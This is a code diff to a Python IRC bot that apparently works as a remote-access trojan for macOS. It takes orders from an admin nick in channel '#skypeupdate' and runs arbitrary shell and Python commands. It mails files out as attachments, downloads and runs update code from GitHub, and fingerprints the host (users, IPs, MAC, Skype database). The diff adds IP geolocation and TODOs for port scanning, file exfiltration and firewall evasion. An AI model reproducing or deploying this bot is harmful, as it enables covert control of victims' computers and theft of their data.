@@ -2,23 +2,36 @@
 # Nick Sweeting © 2013
 # MIT Liscence
 
+# library imports
 import socket
 import getpass
 import random
+import platform
+import uuid
 import signal
 import time
 import os
 import sys
 import subprocess
+import urllib2
+import unicodedata
+import json
 from subprocess import Popen, PIPE, STDOUT
 from time import strftime, sleep
 from StringIO import StringIO
+# module imports
 import skype
 
 #TODO: make skype.findProfile select the largest main.db, instead of failing if there is more than 1
 #TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
+#TODO: modules:
+#       download    will download the file at the given url and save it to the host machine
+#       ports       does a quick port-scan of the system ports 20-1025
+#       send_file   streams the file on the host computer to the given host:port
+#       status      returns the size of the worker's task queue
+#       openvpn     implement openvpn for firewall evasion
 
-version = "2.1.2"                                                 # bot version
+version = "2.1.6"                                                 # bot version
 
 ### Remove/comment this block to disable logging stdout/err to a file
 so = se = open("bot_v%s.log" % version, 'w', 0)
@@ -45,11 +58,11 @@ port = 6667
 channel = '#skypeupdate'
 admin = 'thesquash'                                               # the nick to send privmsgs to, and to check recieved message validity
 
-hostname = socket.gethostname()									  # host's hostname
-main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()		# main user of the computer detected by current owner of /dev/console
-local_user = getpass.getuser()									  # user the bot is running as
+hostname = socket.gethostname()                                   # host's hostname
+main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()        # main user of the computer detected by current owner of /dev/console
+local_user = getpass.getuser()                                    # user the bot is running as
 
-nick = '[%s|%s]' % (main_user, hostname)						  # bot's nickname
+nick = '[%s|%s]' % (main_user, hostname)                          # bot's nickname
 
 helpmsg = '''Version: v%s\n
 Public Commands (main channel): \n
@@ -91,7 +104,7 @@ def sigterm_handler(signum, frame):                               # if user trie
     privmsg('----Subprocess Spawned----')
     irc.send ( 'QUIT\r\n' )
     irc.close()
-    raise SystemExit												
+    raise SystemExit                                                
     sys.exit()
 
 def line_split(seq, n):                                           # if output is multiline, split based on \n and max chars per line (n)
@@ -124,7 +137,6 @@ def privscan(match):                                              # function to 
 
 def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
     if type(msg) is unicode:
-        import unicodedata
         msg = unicodedata.normalize('NFKD', msg).encode('ascii','ignore')
     elif type(msg) is not str or unicode:
         msg = str(msg)
@@ -135,7 +147,7 @@ def privmsg(msg=None, to=admin):                                  # function to 
         total = len(msgs)
         for num, line in enumerate(msgs):
             signal.signal(signal.SIGALRM, timeout_handler)
-            signal.alarm(1)                                       # doubles as flood prevention and input checking
+            signal.alarm(1)                                          # doubles as flood prevention and input checking
             try:
                 data = irc.recv ( 4096 )
                 log('[+] Recieved:')
@@ -146,8 +158,9 @@ def privmsg(msg=None, to=admin):                                  # function to 
                     signal.alarm(0)
                     break
             except:
-                log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
-                irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))      # [1/10] Output line 1 out of 10 total
+                pass
+            log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
+            irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))      # [1/10] Output line 1 out of 10 total
             signal.alarm(0)
 
         log('[#] Finished multiline output.')  
@@ -161,57 +174,57 @@ def broadcast(msg):                                               # function to 
 ############ Keyword functions
 
 def run_shell(cmd, timeout=60, verbose=False):                    # verbose enables live command output via yield
-   out = ''
-   signal.signal(signal.SIGALRM, timeout_handler)
-   signal.alarm(timeout)
-   try:
-      p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
-      log("[$]   Started.")
-      continue_running = 1
-   except Exception as e:
-      yield("Failed: %s" % e)
-      out += "Failed: %s" % e
-      continue_running = 0
-   signal.alarm(0)
-   while(continue_running):
-      signal.signal(signal.SIGALRM, timeout_handler)
-      signal.alarm(4)
-      try:
-         signal.signal(signal.SIGALRM, timeout_handler)
-         signal.alarm(2)
-         try:
-            line = p.stdout.readline()
-            if verbose: yield(line)
-            else: yield(line.strip())
-            out += line
-         except:
-            log('[#] Checking for input.')
-         data = irc.recv ( 4096 )
-         log('[+] Recieved:')
-         log('[>]    ', data)
-         if (data.find('!cancel') != -1):
-            continue_running = 0
-            retcode = "Cancelled."
-            yield("[X]: %s" % retcode)
-            os.killpg(p.pid, signal.SIGTERM)
-            break
-         else:
+    out = ''
+    signal.signal(signal.SIGALRM, timeout_handler)
+    signal.alarm(timeout)
+    try:
+        p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
+        log("[$]   Started.")
+        continue_running = 1
+    except Exception as e:
+        yield("Failed: %s" % e)
+        out += "Failed: %s" % e
+        continue_running = 0
+    signal.alarm(0)
+    while(continue_running):
+        signal.signal(signal.SIGALRM, timeout_handler)
+        signal.alarm(4)
+        try:
+            signal.signal(signal.SIGALRM, timeout_handler)
+            signal.alarm(2)
+            try:
+                line = p.stdout.readline()
+                if verbose: yield(line)
+                else: yield(line.strip())
+                out += line
+            except:
+                log('[#] Checking for input.')
+            data = irc.recv ( 4096 )
+            log('[+] Recieved:')
+            log('[>]    ', data)
+            if (data.find('!cancel') != -1):
+                continue_running = 0
+                retcode = "Cancelled."
+                yield("[X]: %s" % retcode)
+                os.killpg(p.pid, signal.SIGTERM)
+                break
+            else:
+                retcode = p.poll() #returns None while subprocess is running
+        except Exception as e:
             retcode = p.poll() #returns None while subprocess is running
-      except Exception as e:
-         retcode = p.poll() #returns None while subprocess is running
-         log('[#] Done Checking.')
-      signal.alarm(0)
-      if (retcode is not None):
-         line = p.stdout.read()
-         if verbose: yield(line)
-         out += line
-         out += "[$] Exit Status: %s" % retcode
-         if (retcode != 0):
-            yield("[X]: %s" % retcode)
-         elif (retcode == 0) and verbose:
-            yield("[√]")
-         continue_running = 0
-         break
+            log('[#] Done Checking.')
+        signal.alarm(0)
+        if (retcode is not None):
+            line = p.stdout.read()
+            if verbose: yield(line)
+            out += line
+            out += "[$] Exit Status: %s" % retcode
+            if (retcode != 0):
+                yield("[X]: %s" % retcode)
+            elif (retcode == 0) and verbose:
+                yield("[√]")
+            continue_running = 0
+            break
 
 def run_python(cmd):                                              # interactively interprets recieved python code
     try:
@@ -255,59 +268,86 @@ def run(cmd, public=False):                                       # wrapper for 
         log("\n")
 
 def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Info",attch=[]): # do not use attch.append() http://stackoverflow.com/a/113198/2156113
-   err = """\n
-      sudo mkdir -p /Library/Server/Mail/Data/spool\n
-      sudo /usr/sbin/postfix set-permissions\n
-      sudo /usr/sbin/postfix start
-      """
-   if len(attch) > 0:
-      for attachment in attch:
-         try:
-            cmd = 'uuencode %s %s | mailx -s "%s" %s' % (attachment.strip(), attachment.strip(), subj, to)
-            log('[+] Sending email...')
-            log('[<]    ',cmd)
-            sts = run(cmd, public=False)
-            return "Sending email to %s. (subject: %s, attachments: %s\n[X]: %s)" % (to, subj, str(attch), str(sts))
-         except Exception as error:
-            return str(error)
-   else:
-      p = os.popen("/usr/sbin/sendmail -t", "w")
-      p.write("To: %s" % to)
-      p.write("Subject: %s" % subj)
-      p.write("\n") # blank line separating headers from body
-      p.write('%s\n' % msg)
-      sts = p.close()
-   if sts != None:
-      return "Error: %s. Please fix Postfix with: %s" % (sts, err)
-   else:
-      return "Sent email to %s. (subject: %s, attachments: %s)" % (to, subj, str(attch))
+    err = """\n
+        sudo mkdir -p /Library/Server/Mail/Data/spool\n
+        sudo /usr/sbin/postfix set-permissions\n
+        sudo /usr/sbin/postfix start
+        """
+    if len(attch) > 0:
+        for attachment in attch:
+            try:
+                cmd = 'uuencode %s %s | mailx -s "%s" %s' % (attachment.strip(), attachment.strip(), subj, to)
+                log('[+] Sending email...')
+                log('[<]    ',cmd)
+                sts = run(cmd, public=False)
+                return "Sending email to %s. (subject: %s, attachments: %s\n[X]: %s)" % (to, subj, str(attch), str(sts))
+            except Exception as error:
+                return str(error)
+    else:
+        p = os.popen("/usr/sbin/sendmail -t", "w")
+        p.write("To: %s" % to)
+        p.write("Subject: %s" % subj)
+        p.write("\n") # blank line separating headers from body
+        p.write('%s\n' % msg)
+        sts = p.close()
+    if sts != None:
+        return "Error: %s. Please fix Postfix with: %s" % (sts, err)
+    else:
+        return "Sent email to %s. (subject: %s, attachments: %s)" % (to, subj, str(attch))
 
 def selfupdate(git_user="nikisweeting",git_repo="violent-python"):   # updates the bot by downloading source from github, then running update.sh
-   log('[*] Starting Selfupdate...')
-   privmsg('[*] Starting Selfupdate...')
-   log('[>]   Downloading source code from git')
-   cmd = "rm -Rf code.zip code; curl https://codeload.github.com/%s/%s/zip/master > code.zip" % (git_user, git_repo)
-   for line in run_shell(cmd):
-      log('[>]    ',line)
-      privmsg('[>]    %s' % line)
-   cmd = "unzip code.zip -d code"
-   for line in run_shell(cmd):
-      log('[>]    ',line)
-      privmsg('[>]    %s' % line)
-   pid = os.getpid()
-   cmd = "sh code/*/update.sh %s" % pid
-   for line in run_shell(cmd):
-      log('[>]    ',line)
-      privmsg('[>]    %s' % line)
-      if line.find("Starting") != -1:
-         privmsg("[+] Shutting down for update. Log saved in updatelog.txt")
-         quit_status = True
-         irc.send ( 'QUIT\r\n' )
-         raise SystemExit(0)
+    log('[*] Starting Selfupdate...')
+    privmsg('[*] Starting Selfupdate...')
+    log('[>]   Downloading source code from git')
+    cmd = "rm -Rf code.zip code; curl https://codeload.github.com/%s/%s/zip/master > code.zip" % (git_user, git_repo)
+    for line in run_shell(cmd):
+        log('[>]    ',line)
+        privmsg('[>]    %s' % line)
+    cmd = "unzip code.zip -d code"
+    for line in run_shell(cmd):
+        log('[>]    ',line)
+        privmsg('[>]    %s' % line)
+    pid = os.getpid()
+    cmd = "sh code/*/update.sh %s" % pid
+    for line in run_shell(cmd):
+        log('[>]    ',line)
+        privmsg('[>]    %s' % line)
+        if line.find("Starting") != -1:
+            privmsg("[+] Shutting down for update. Log saved in updatelog.txt")
+            quit_status = True
+            irc.send ( 'QUIT\r\n' )
+            raise SystemExit(0)
+
+def geo_locate(ip="",with_proxy=False):                                                   # fetch location based on IP
+    signal.signal(signal.SIGALRM, timeout_handler)
+    signal.alarm(5)
+    try:
+        if not with_proxy:
+            proxy_handler = urllib2.ProxyHandler({})
+            opener = urllib2.build_opener(proxy_handler)
+            req = urllib2.Request('http://freegeoip.net/json/%s' % ip)
+            r = opener.open(req)
+            geo_json = r.read()
+        else:
+            geo_json = urllib2.urlopen('http://freegeoip.net/json/%s' % ip).read()
+    except Exception as e:
+        return ["failed: %s" % e,"","","","",""]
+    signal.alarm(0)
+
+    geo = json.loads(geo_json)
+
+    city = geo[u"city"].encode('utf-8')
+    region = geo[u"region_name"].encode('utf-8')
+    country = geo[u"country_name"].encode('utf-8')
+    zipcode = geo[u"zipcode"].encode('utf-8')
+
+    lat = geo[u"latitude"]
+    lng = geo[u"longitude"]
+
+    return [city,country,region,zipcode,lat,lng]
 
 def identify():                                                   # give some identifying info about the host computer
-    log('[+] Running Identification Scripts...')
-    import platform
+    log('[+] Running v%s Identification Modules...' % version)
     system = platform.mac_ver()[0]
     if len(str(system)) < 1:
         system = platform.platform()
@@ -317,18 +357,15 @@ def identify():                                                   # give some id
     local_ip = s.getsockname()[0]
     s.close()
     log('[>]    Local:   ',local_ip)
-    import urllib2
     public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
     log('[>]    Public:  ',public_ip)
-    import uuid
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
     log('[>]    MAC:     ',mac_addr)
     return "[v%s/x%s] %s@%s u: %s l: %s p: %s MAC: %s" % (version, system.strip(), local_user, hostname, main_user, local_ip, public_ip, mac_addr)
  
 def full_identify():                                              # give verbose identifying info about the host computer
-    log('[+] Running Identification Scripts...')
-    privmsg('[+] Running Identification Scripts...')
-    import platform
+    log('[+] Running v%s Identification Modules...' % version)
+    privmsg('[+] Running v%s Identification Modules...' % version)
     system = platform.mac_ver()[0]
     log('[>]    OS X:    ',system)
     privmsg('[>]      OS X:    %s' % system)
@@ -346,12 +383,10 @@ def full_identify():                                              # give verbose
     log('[>]    Local:   ',local_ip)
     privmsg('[>]      Local:   %s' % local_ip)
 
-    import urllib2
     public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
     log('[>]    Public:  ',public_ip)
     privmsg('[>]      Public:  %s' % public_ip)
     
-    import uuid
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
     log('[>]    MAC:     ',mac_addr)
     privmsg('[>]      MAC:     %s' % mac_addr)
@@ -365,6 +400,12 @@ def full_identify():                                              # give verbose
     for line in run_shell(cmd):
         log('[>]    UP:    ',line)
         privmsg('[>]      Up:    %s' % line)
+
+    geo_info = geo_locate()
+    location = geo_info[0]+", "+geo_info[1]+" ("+str(geo_info[4])+", "+str(geo_info[5])+")"
+
+    log('[>]    Geoip:    ',location)
+    privmsg('[>]      Location:    %s' % location)
 
     try:
         db_path = skype.findProfile(local_user)
